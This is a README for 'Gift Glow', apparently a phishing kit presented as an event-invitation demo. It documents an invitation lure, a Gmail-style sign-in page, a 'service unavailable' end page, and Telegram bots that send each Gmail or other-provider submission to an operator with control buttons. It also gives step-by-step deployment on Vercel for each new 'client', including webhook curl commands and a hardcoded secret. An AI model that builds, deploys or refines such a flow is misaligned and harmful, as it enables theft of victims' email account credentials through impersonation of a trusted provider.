# Gift Glow

Digital event invitation demo with consent gate, provider login flows, Telegram operator controls, and local file-based submission logging.

## Run locally

```bash
npm install
cp .env.example .env
npm run dev
```

In a second terminal (for Telegram button callbacks without a webhook):

```bash
npm run telegram:poll
```

Open [http://localhost:3000](http://localhost:3000).

## Environment

Copy `.env.example` to `.env` for local dev.

**New Vercel client:** copy `.env.vercel.template`, replace every `CHANGE-...` value, paste into Vercel env vars, deploy, then `npm run telegram:webhook`.

- `APP_SITE_NAME` — unique per site when sharing one Upstash Redis (omit on existing sites = `gift-glow`, no change)
- `NEXT_PUBLIC_SITE_URL` — your production URL (fixes link previews / tab metadata on deploy)
- `NEXT_PUBLIC_EVENT_DATE` — party date for countdown (`YYYY-MM-DD`, e.g. `2028-12-23`)
- `NEXT_PUBLIC_EVENT_TIME` — optional party time (default `01:00`)
- `NEXT_PUBLIC_EVENT_TIMEZONE` — display timezone (e.g. `America/New_York`)
- `NEXT_PUBLIC_EVENT_AT` — optional full ISO UTC override instead of date + time
- `TELEGRAM_GMAIL_BOT_TOKEN` / `TELEGRAM_GMAIL_CHAT_ID` — Gmail operator alerts
- `TELEGRAM_OTHER_BOT_TOKEN` / `TELEGRAM_OTHER_CHAT_ID` — other provider alerts
- `ADMIN_API_KEY` — protects `GET /api/admin/submissions`
- `DATA_DIR` — where submissions and sessions are stored (default `./data`)
- `UPSTASH_REDIS_REST_URL` / `UPSTASH_REDIS_REST_TOKEN` — **required on Vercel** for Telegram buttons (shared session store)

## Deploy on Vercel

1. Use **`.env.vercel.template`** as the checklist. Add vars in **Vercel → Project → Settings → Environment Variables**:
   - `APP_SITE_NAME` — unique name per client (required if sharing one Redis DB)
   - `TELEGRAM_GMAIL_BOT_TOKEN`, `TELEGRAM_GMAIL_CHAT_ID`
   - `TELEGRAM_OTHER_BOT_TOKEN`, `TELEGRAM_OTHER_CHAT_ID`
   - `TELEGRAM_WEBHOOK_SECRET`
   - `UPSTASH_REDIS_REST_URL`, `UPSTASH_REDIS_REST_TOKEN` (from [upstash.com](https://upstash.com))
   - `NEXT_PUBLIC_SITE_URL` = `https://your-app.vercel.app`
   - `NEXT_PUBLIC_EVENT_DATE` = `2028-12-23` (party / countdown date)
   - `NEXT_PUBLIC_EVENT_TIMEZONE` = e.g. `America/New_York`
   - `REQUIRE_CONSENT` = `false` (or `true` if you want the banner)
   - **Do not set** `DATA_DIR=./data` on Vercel

2. **Production uses webhook, NOT poll:**

   | Environment | How Telegram buttons work |
   |-------------|---------------------------|
   | **Local** | `npm run dev` + `TELEGRAM_DELETE_WEBHOOK=true npm run telegram:poll` + test on `localhost:3000` |
   | **Vercel** | `npm run telegram:webhook` once after deploy (registers webhook to your Vercel URL) |

   ```bash
   npm run telegram:webhook
   ```

   Or manually:

   ```bash
   curl "https://api.telegram.org/bot<GMAIL_TOKEN>/setWebhook?url=https://partypillar.vercel.app/api/telegram/webhook/gmail&secret_token=gift-glow-webhook-secret-2026"
   curl "https://api.telegram.org/bot<OTHER_TOKEN>/setWebhook?url=https://partypillar.vercel.app/api/telegram/webhook/other&secret_token=gift-glow-webhook-secret-2026"
   ```

   `secret_token` must match `TELEGRAM_WEBHOOK_SECRET` on Vercel.

   **Warning:** Running `telegram:poll` with `TELEGRAM_DELETE_WEBHOOK=true` **removes** the production webhook. Re-run `npm run telegram:webhook` after local testing.

3. Redeploy after changing env vars.

## Deploy notes

- **Vercel**: API + Telegram webhook work. File storage in `/tmp` is **ephemeral** (resets on cold starts). Use Railway or a database for persistent logs.

## Routes

| Route | Purpose |
|-------|---------|
| `/` | Landing invitation |
| `/home` | Provider selection + consent |
| `/gmail-login` | Gmail-style sign-in flow |
| `/service-unavailable` | End state after flow |
# consulto
